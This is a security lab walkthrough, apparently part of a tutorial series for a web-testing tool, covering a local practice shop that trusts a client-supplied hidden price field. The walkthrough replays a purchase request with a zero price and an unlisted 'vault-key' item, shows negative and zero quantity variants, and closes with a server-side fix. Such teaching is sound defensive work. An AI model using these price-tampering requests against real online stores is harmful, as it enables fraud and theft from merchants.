# Lab 02 — Curio Shop

## Recon

```bash
h5i browser open http://127.0.0.1:9020/ --session lab02 --new --capture
h5i browser snapshot --session lab02
```

Three hidden inputs per form: `item`, `price`, `qty`. Click one and read what
the browser sent:

```bash
h5i browser click @e2 --session lab02
h5i websec requests --session lab02 --method POST
h5i websec show req_1 --session lab02 --raw
```

```
POST /buy HTTP/1.1
…
item=mug&price=9&qty=1
```

The catalogue's own answer to "what does a mug cost" travelled *from the
browser to the server*. `type="hidden"` hides a field from a person. It does
not hide it from the person's HTTP client.

## The bug

```python
total = int(form.get("price", "0")) * int(form.get("qty", "1"))
```

The server has `CATALOGUE` in the same process and never opens it. It validates
that `item` exists, which makes the omission look deliberate — the developer
checked the field they thought was untrusted.

Note the second half: `vault-key` is *not rendered* and is *still routable*.
Absence from the UI is not absence from the API.

## The exploit

```bash
h5i websec replay req_1 --session lab02 \
    --set form.item=vault-key --set form.price=0
h5i websec show res_2 --session lab02 --raw
```

Or, without clicking anything, build the request from the homepage GET:

```bash
h5i websec replay req_0 --session lab02 --create \
    --set method=POST --set path=/buy \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.item=vault-key --set form.price=0 --set form.qty=1
```

**`--create` is the flag to internalise now.** By default `--set` refuses a
target that is not in the stored request, because a parameter that does not
exist is usually a typo, and a typo that silently succeeds costs you a whole
turn reading a response that was never going to differ. When you *mean* to add
something new, say so.

## Variants worth trying

* `--set form.qty=-3` — a negative quantity makes the total negative, which
  passes `total > 20` just as well. Signedness is its own bug class.
* `--set form.price=9 --set form.qty=0` — free by another route.

## The fix

Send an item id and a quantity. Look the price up server-side. Reject
quantities outside `1..=limit` before arithmetic, and compare against a balance
the server also owns.

## h5i technique

`--set form.<name>=` edits `application/x-www-form-urlencoded` bodies; the
sibling targets are `json.<name>` (Lab 15), `multipart.<name>` (Lab 18) and
`body.raw` for bytes you want to place yourself.
